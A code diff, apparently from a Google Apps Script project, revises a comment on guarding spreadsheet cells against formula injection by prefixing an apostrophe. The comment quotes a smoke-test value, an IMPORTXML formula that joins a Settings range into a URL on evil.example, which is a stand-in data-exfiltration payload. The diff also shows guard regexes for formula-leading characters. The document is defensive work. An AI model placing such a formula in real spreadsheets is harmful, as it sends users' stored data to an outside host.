@@ -1086,11 +1086,15 @@ var FORMULA_LEAD_ = /^[=+\-@\t\r]/;
 // is eaten on the way in: "'tis a scope" would come back as "tis a scope". Writing
 // two means one survives.
 //
-// Escaping it also makes the round trip correct without having to know whether the
-// API returns the marker or swallows it — the two are mutually exclusive and the
-// code used to hedge both ways. Written this way, both land on the original value:
-// if the marker is eaten, the cell holds exactly what was passed and the read below
-// finds nothing to strip; if it is kept, the read strips the one that was added.
+// Escaping it also settles a hedge. The code both wrote the marker and stripped it
+// on the way back, which cannot both be right — and nothing here could tell which,
+// because the model sheet the tests run against has no opinion about apostrophes.
+// smokeTest() answered it on the real thing on 2026-08-20: getValues() returned
+//   =IMPORTXML("https://evil.example/?d="&JOIN(",",Settings!A1:B99),"//a")
+// with no leading apostrophe. Sheets eats the marker. So the strip in normalizeRow_
+// never fires in production — it is kept because it costs nothing and makes the
+// round trip land on the original value under either behaviour, which is the
+// property that made this safe to change without knowing the answer first.
 // (A value that genuinely starts with two apostrophes loses one. Noted, not fixed.)
 var NEEDS_GUARD_ = /^['=+\-@\t\r]/;
 
